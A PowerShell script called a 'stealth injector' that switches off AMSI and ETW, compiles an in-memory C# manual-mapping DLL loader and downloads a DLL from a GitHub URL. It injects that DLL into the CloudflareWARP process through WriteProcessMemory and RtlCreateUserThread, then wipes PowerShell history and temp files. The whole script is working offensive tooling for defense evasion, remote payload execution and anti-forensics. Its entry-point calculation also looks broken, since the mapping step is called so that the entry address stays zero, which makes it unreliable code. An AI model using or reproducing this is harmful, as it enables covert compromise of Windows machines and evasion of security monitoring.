# ============================================================
#  FIXED STEALTH INJECTOR (NO VirtualAlloc overload error)
# ============================================================
[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param()

Set-StrictMode -Version Latest

$DebugMode = $true

function Write-DebugInfo {
    param($Message, $Color = "Cyan")
    if ($DebugMode) {
        Write-Host "[DEBUG] $Message" -ForegroundColor $Color
    }
}

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "      FIXED STEALTH INJECTOR            " -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-DebugInfo "Script starting..." -Color "Green"

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
} else {
    Write-DebugInfo "✅ Running as Administrator." -Color "Green"
}

Write-DebugInfo "Console will stay visible." -Color "Yellow"

# ---------- AMSI + ETW Bypass ----------
Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)

    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class EtwOff {
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
        public static void Disable() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 0);
            NtSetInformationProcess(p, 0x5E, ptr, 4);
            Marshal.FreeHGlobal(ptr);
        }
    }
"@ -IgnoreWarnings
    [EtwOff]::Disable()
    Write-DebugInfo "✅ AMSI & ETW bypassed." -Color "Green"
} catch {
    Write-DebugInfo "❌ Bypass failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

# ---------- C# Loader (ONLY VirtualAllocEx, NO VirtualAlloc with 5 args) ----------
Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
$kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public class ManualMapResult
{
    public IntPtr ImageBase;
    public uint ImageSize;
    public IntPtr DllMainAddr;
    public long Delta;
    public bool Is64Bit;
}

public static class NativeLoader
{
    // Local allocation (4 args)
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    // Remote allocation (5 args) – CORRECT
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetModuleHandleA(string lpModuleName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string lpFileName);
    [DllImport("kernel32.dll")]
    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll")]
    static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, uint StackZeroBits, uint StackReserve, uint StackCommit, IntPtr StartAddress, IntPtr Parameter, out IntPtr ThreadHandle, IntPtr ClientId);
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READONLY = 0x02;

    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
    static ulong  RU64(IntPtr p, long o) {
        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4));
        return (ulong)((hi<<32)|lo);
    }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
    static void WU32(IntPtr p, long o, uint v)   { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }

    static string RAscii(IntPtr p, long o) {
        var sb = new StringBuilder();
        for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); }
        return sb.ToString();
    }

    static uint SectionProtectionToPageProtection(uint characteristics) {
        bool x = (characteristics & 0x20000000) != 0;
        bool w = (characteristics & 0x80000000) != 0;
        bool r = (characteristics & 0x40000000) != 0;
        if (x && w) return PAGE_EXECUTE_READWRITE;
        if (x && r) return PAGE_EXECUTE_READ;
        if (x) return PAGE_EXECUTE_READ;
        if (w) return PAGE_READWRITE;
        return PAGE_READONLY;
    }

    struct Section { public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, Characteristics; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    public static bool InjectIntoWarp(byte[] dllBytes)
    {
        try {
            Console.WriteLine("[C#] Searching for CloudflareWARP process...");
            int pid = 0;
            foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
            if (pid == 0) { Console.WriteLine("[C#] ERROR: CloudflareWARP not found."); return false; }
            Console.WriteLine("[C#] Found PID: " + pid);

            Console.WriteLine("[C#] Opening process...");
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
            if (hProcess == IntPtr.Zero) { Console.WriteLine("[C#] OpenProcess failed."); return false; }
            Console.WriteLine("[C#] Process opened.");

            Console.WriteLine("[C#] Manual mapping locally...");
            var mapResult = Map(dllBytes, false);
            if (mapResult.ImageBase == IntPtr.Zero) { Console.WriteLine("[C#] Map failed."); return false; }
            Console.WriteLine("[C#] Mapped at 0x" + mapResult.ImageBase.ToString("X"));

            Console.WriteLine("[C#] Allocating remote memory via VirtualAllocEx (5 args)...");
            IntPtr remoteBase = IntPtr.Zero;
            UIntPtr size = (UIntPtr)mapResult.ImageSize;
            remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
            if (remoteBase == IntPtr.Zero) {
                Console.WriteLine("[C#] VirtualAllocEx failed. LastError: " + Marshal.GetLastWin32Error());
                return false;
            }
            Console.WriteLine("[C#] Remote memory at 0x" + remoteBase.ToString("X"));

            Console.WriteLine("[C#] Copying image...");
            byte[] imageData = new byte[mapResult.ImageSize];
            Marshal.Copy(mapResult.ImageBase, imageData, 0, (int)mapResult.ImageSize);
            IntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, remoteBase, imageData, (uint)mapResult.ImageSize, out bytesWritten)) {
                Console.WriteLine("[C#] WriteProcessMemory failed.");
                return false;
            }
            Console.WriteLine("[C#] Copied " + bytesWritten.ToInt64() + " bytes.");

            IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (mapResult.DllMainAddr.ToInt64() - mapResult.ImageBase.ToInt64()));
            Console.WriteLine("[C#] Entry point at 0x" + entryPoint.ToString("X"));

            Console.WriteLine("[C#] Creating thread via RtlCreateUserThread...");
            IntPtr hThread;
            int status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
            if (status != 0) { Console.WriteLine("[C#] RtlCreateUserThread failed, status=" + status); return false; }
            Console.WriteLine("[C#] Thread created.");

            System.Threading.Thread.Sleep(200);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            Console.WriteLine("[C#] Injection complete.");
            return true;
        } catch (Exception ex) {
            Console.WriteLine("[C#] EXCEPTION: " + ex.Message);
            return false;
        }
    }

    private static ManualMapResult Map(byte[] dll, bool callEntry)
    {
        var res = new ManualMapResult();
        if (U16(dll, 0) != 0x5A4D) throw new Exception("Invalid MZ");
        int lfanew = BitConverter.ToInt32(dll, 0x3C);
        if (U32(dll, lfanew) != 0x4550) throw new Exception("Invalid PE");

        int co = lfanew + 4;
        ushort machine = U16(dll, co + 4);
        ushort numberOfSections = U16(dll, co + 2);
        ushort optionalHeaderSize = U16(dll, co + 16);
        int optionalOffset = co + 20;
        bool is64 = (machine == 0x8664);
        res.Is64Bit = is64;
        uint entryPointRVA = U32(dll, optionalOffset + 16);
        uint sizeOfImage = U32(dll, optionalOffset + 56);
        uint sizeOfHeaders = U32(dll, optionalOffset + 60);
        ulong imageBase = is64 ? U64(dll, optionalOffset + 24) : U32(dll, optionalOffset + 28);
        res.ImageSize = sizeOfImage;

        int dataDirectoryOffset = is64 ? optionalOffset + 112 : optionalOffset + 96;
        uint importRVA = U32(dll, dataDirectoryOffset + 8);
        uint relocRVA = U32(dll, dataDirectoryOffset + 40);
        uint relocSize = U32(dll, dataDirectoryOffset + 44);

        int sectionOffset = optionalOffset + optionalHeaderSize;
        Section[] sections = new Section[numberOfSections];
        for (int i = 0; i < numberOfSections; i++) {
            int off = sectionOffset + i * 40;
            sections[i] = new Section {
                VirtualSize = U32(dll, off + 8),
                VirtualAddress = U32(dll, off + 12),
                SizeOfRawData = U32(dll, off + 16),
                PointerToRawData = U32(dll, off + 20),
                Characteristics = U32(dll, off + 36)
            };
        }

        IntPtr image = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (image == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase = image;
        long baseAddr = image.ToInt64();
        long delta = baseAddr - (long)imageBase;
        res.Delta = delta;

        // Copy headers
        Marshal.Copy(dll, 0, image, (int)sizeOfHeaders);

        // Copy sections
        foreach (var sec in sections) {
            if (sec.SizeOfRawData == 0) continue;
            uint copySize = (sec.VirtualSize == 0) ? sec.SizeOfRawData : Math.Min(sec.VirtualSize, sec.SizeOfRawData);
            if (sec.PointerToRawData + copySize > (uint)dll.Length) {
                copySize = (uint)dll.Length - sec.PointerToRawData;
                if (copySize == 0) continue;
            }
            Marshal.Copy(dll, (int)sec.PointerToRawData, (IntPtr)(baseAddr + sec.VirtualAddress), (int)copySize);
        }

        // Relocations
        if (relocRVA != 0 && delta != 0) {
            uint relocAddr = relocRVA;
            uint relocEnd = relocRVA + relocSize;
            while (relocAddr < relocEnd) {
                uint pageRVA = RU32(image, relocAddr);
                uint blockSize = RU32(image, relocAddr + 4);
                if (blockSize == 0) break;
                int entryCount = (int)(blockSize - 8) / 2;
                for (int i = 0; i < entryCount; i++) {
                    ushort entry = RU16(image, relocAddr + 8 + i * 2);
                    int type = (entry >> 12) & 0xF;
                    int offset = entry & 0xFFF;
                    if (type == 0) continue;
                    long targetRVA = pageRVA + offset;
                    if (type == 10) { // IMAGE_REL_BASED_DIR64
                        ulong value = RU64(image, targetRVA);
                        WU64(image, targetRVA, (ulong)((long)value + delta));
                    } else if (type == 3) { // IMAGE_REL_BASED_HIGHLOW
                        uint value = RU32(image, targetRVA);
                        WU32(image, targetRVA, (uint)((long)value + delta));
                    }
                }
                relocAddr += blockSize;
            }
        }

        // Imports
        if (importRVA != 0) {
            int importIndex = 0;
            while (true) {
                long entryOffset = importRVA + importIndex * 20;
                uint importLookupRVA = RU32(image, entryOffset);
                uint importNameRVA = RU32(image, entryOffset + 12);
                uint importAddressRVA = RU32(image, entryOffset + 16);
                if (importNameRVA == 0) break;

                string dllName = RAscii(image, importNameRVA);
                IntPtr hMod = GetModuleHandleA(dllName);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) { importIndex++; continue; }

                long thunkOffset = 0;
                uint thunkBase = (importLookupRVA != 0) ? importLookupRVA : importAddressRVA;
                int ptrSize = is64 ? 8 : 4;
                while (true) {
                    long thunkAddr = thunkBase + thunkOffset;
                    long thunkValue = is64 ? (long)RU64(image, thunkAddr) : (long)RU32(image, thunkAddr);
                    if (thunkValue == 0) break;
                    IntPtr funcPtr = IntPtr.Zero;
                    if ((thunkValue & (is64 ? 0x8000000000000000L : 0x80000000L)) != 0) {
                        uint ordinal = (uint)(thunkValue & 0xFFFF);
                        funcPtr = GetProcAddress(hMod, (IntPtr)ordinal);
                    } else {
                        string funcName = RAscii(image, thunkValue + 2);
                        funcPtr = GetProcAddress(hMod, funcName);
                    }
                    if (funcPtr != IntPtr.Zero) {
                        IntPtr iatAddr = (IntPtr)(baseAddr + importAddressRVA + thunkOffset);
                        if (is64) Marshal.WriteInt64(iatAddr, funcPtr.ToInt64());
                        else Marshal.WriteInt32(iatAddr, funcPtr.ToInt32());
                    }
                    thunkOffset += ptrSize;
                }
                importIndex++;
            }
        }

        // Set section permissions
        foreach (var sec in sections) {
            uint size = Math.Max(sec.VirtualSize, sec.SizeOfRawData);
            if (size == 0) continue;
            uint newProt = SectionProtectionToPageProtection(sec.Characteristics);
            uint oldProt;
            VirtualProtect((IntPtr)(baseAddr + sec.VirtualAddress), (UIntPtr)size, newProt, out oldProt);
        }

        FlushInstructionCache(GetCurrentProcess(), image, (UIntPtr)sizeOfImage);

        res.DllMainAddr = IntPtr.Zero;
        if (callEntry && entryPointRVA != 0) {
            res.DllMainAddr = (IntPtr)(baseAddr + entryPointRVA);
            try {
                var dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr, typeof(DllMainDelegate));
                dllMain(image, 1, IntPtr.Zero);
            } catch { }
        }
        return res;
    }
}
'@

try {
    $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
    $params = New-Object System.CodeDom.Compiler.CompilerParameters
    $params.GenerateInMemory = $true
    $params.GenerateExecutable = $false
    $params.IncludeDebugInformation = $false
    $params.CompilerOptions = '/target:library /optimize+'
    $params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
    $result = $compiler.CompileAssemblyFromSource($params, $kernel)
    if ($result.Errors.Count -gt 0) {
        Write-DebugInfo "❌ Compilation error: $($result.Errors[0].ErrorText)" -Color "Red"
        Read-Host "Press ENTER to exit"
        exit
    }
    Write-DebugInfo "✅ C# loader compiled successfully." -Color "Green"
} catch {
    Write-DebugInfo "❌ Compilation failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

$assembly = $result.CompiledAssembly
$loaderType = $assembly.GetType('NativeLoader')
$method = $loaderType.GetMethod('InjectIntoWarp')

# ---------- Download DLL ----------
Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
    Write-DebugInfo "✅ DLL downloaded (size: $($bytes.Length) bytes)" -Color "Green"
} catch {
    Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

# ---------- Inject ----------
Write-DebugInfo "Calling injection..." -Color "Yellow"
Write-Host ""
Write-Host "========== C# OUTPUT ==========" -ForegroundColor Magenta
try {
    $success = $method.Invoke($null, @($bytes))
    Write-Host "=================================" -ForegroundColor Magenta
    if ($success) {
        Write-DebugInfo "✅ Injection successful!" -Color "Green"
    } else {
        Write-DebugInfo "❌ Injection failed. Check C# output." -Color "Red"
    }
} catch {
    Write-Host "=================================" -ForegroundColor Magenta
    Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
}

# ---------- Cleanup ----------
Write-DebugInfo "Cleaning up..." -Color "Yellow"
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
Clear-History
$historyPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Write-DebugInfo "✅ Cleanup complete." -Color "Green"

Write-DebugInfo "Done. Press ENTER to close." -Color "Magenta"
Read-Host
